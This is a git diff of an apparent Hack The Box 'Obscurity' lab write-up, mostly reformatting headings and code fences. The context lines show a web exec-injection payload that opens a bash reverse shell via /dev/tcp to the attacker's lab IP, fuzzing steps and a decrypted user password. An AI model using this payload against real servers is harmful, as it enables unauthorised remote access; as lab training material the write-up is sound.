@@ -2,6 +2,7 @@
 title:     "Hack The Box - Obscurity"
 tags: [linux,medium,python,sudo]
 layout: post
+categories : HackTheBox
 ---
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/1.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/1.png)
@@ -14,7 +15,7 @@ Like always begin with our Nmap Scan.
 
 ## Nmap Scan Results:
 
-```
+```bash
 PORT     STATE  SERVICE
 22/tcp   open   ssh
 80/tcp   closed http
@@ -136,7 +137,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kern
 
 Nmap dump some unusual things.
 
-## HTTP:
+## HTTP Enumeration
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/2.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/2.png)
 
@@ -152,13 +153,15 @@ So I tried Bruteforcing the webpage
 
 Nothing!
 
+## Fuzzing Directories
+
 Since it doesn't give me anything useful, we know the script name `SuperSecureServer.py` so I tried [Wfuzz](https://github.com/xmendez/wfuzz).
 
 > wfuzz - a web application brute forcer.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/5.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/5.png)
 
-```jsx
+```bash
 --hc/hl/hw/hh N[,N]+
               Hide  responses  with  the specified code/lines/words/chars (Use
               BBB for taking values from baseline)
@@ -190,11 +193,11 @@ I googled about how to exploit exec and found this!!
 Using the article I created mine, At first, I tried without `bash -c` but that didn't work but when I tried this, it worked.
 I send `'` as the string which it is expecting from us.
 
-```python
+```py
 `10.10.10.168:8080/';__import__("os").system("bash -c 'bash -i >& /dev/tcp/10.10.14.31/1234 0>&1'")%23`
 ```
 
-## Shell as www-data:
+## Shell as www-data
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/9.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/9.png)
 
@@ -202,7 +205,7 @@ We got the shell!!
 
 There is a user `robert` while checking his home directory. Found some files.
 
-```python
+```bash
 www-data@obscure:/home/robert$ ls
 ls
 BetterSSH
@@ -213,9 +216,11 @@ SuperSecureCrypt.py
 user.txt
 ```
 
+## Analysing the Python Script
+
 I used `-h` to get the usage of `SuperSecureCrypt.py` and it do some encryption and decryption using a key.
 
-```python
+```bash
 python3 SuperSecureCrypt.py -h
 usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]
 
@@ -233,13 +238,13 @@ So this is how it works!
 
 I started checking other files in that directory.
 
-```python
+```bash
 www-data@obscure:/home/robert$ cat check.txt
 cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct!
 ```
 
-```python
+```bash
 www-data@obscure:/home/robert$ cat passwordreminder.txt
 cat passwordreminder.txt
 ´ÑÈÌÉàÙÁÑé¯·¿k
@@ -258,7 +263,7 @@ So We already know that the script needs `a key` and `a file` that needs to be e
 
 I assumed this is what happened so far, `check.txt` is the key.
 
-### Encode:
+### Encode
 
 ```
 <message> + check.txt  >> Encryption script >> out.txt 
@@ -267,14 +272,14 @@ Password + <message> >> Encryption script >> passwordreminder.txt
 
 Now we need to revert this.
 
-### Decode:
+### Decode
 
 ```
 out.key + check.txt >> Decryption script >> <message>
 passwordreminder.txt + <message> >> Decryption script >> Password
 ```
 
-## Playing with the Python Script:
+## Playing with the Python Script
 
 ```python
 python3 SuperSecureCrypt.py -i out.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -o /tmp/key1 -d
@@ -292,7 +297,7 @@ Got `SecThruObsFTW` maybe it will be robert's password.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/12.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/12.png)
 
-## Privilege Escalation:
+## Privilege Escalation
 
 Like always I started with `sudo -l`
 
